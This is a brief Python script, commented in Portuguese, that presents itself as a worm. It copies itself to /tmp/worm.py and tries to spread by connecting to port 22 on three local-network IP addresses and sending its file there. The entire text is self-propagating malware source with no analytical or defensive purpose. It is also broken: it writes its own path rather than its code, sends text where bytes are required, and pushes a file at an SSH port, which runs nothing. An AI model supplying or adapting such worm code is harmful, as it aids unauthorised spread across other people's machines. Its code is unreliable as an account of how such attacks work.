import os
import socket

# Caminho para o arquivo do worm
arquivo_worm = "/tmp/worm.py"

# Se o worm já existir no sistema, não faz nada
if os.path.exists(arquivo_worm):
    exit()

# Caso contrário, cria uma cópia dele no sistema
with open(arquivo_worm, "w") as f:
    f.write(__file__)

# Lista de endereços IP para os quais o worm deve se espalhar
alvos = ["192.168.0.1", "192.168.0.2", "192.168.0.3"]

# Ficando em loop para tentar se espalhar para cada alvo
for alvo in alvos:
    # Criando um socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Tentando conectar ao alvo
    client.connect((alvo, 22))

    # Enviando o arquivo do worm para o alvo
    with open(arquivo_worm, "r") as f:
        client.send(f.read())
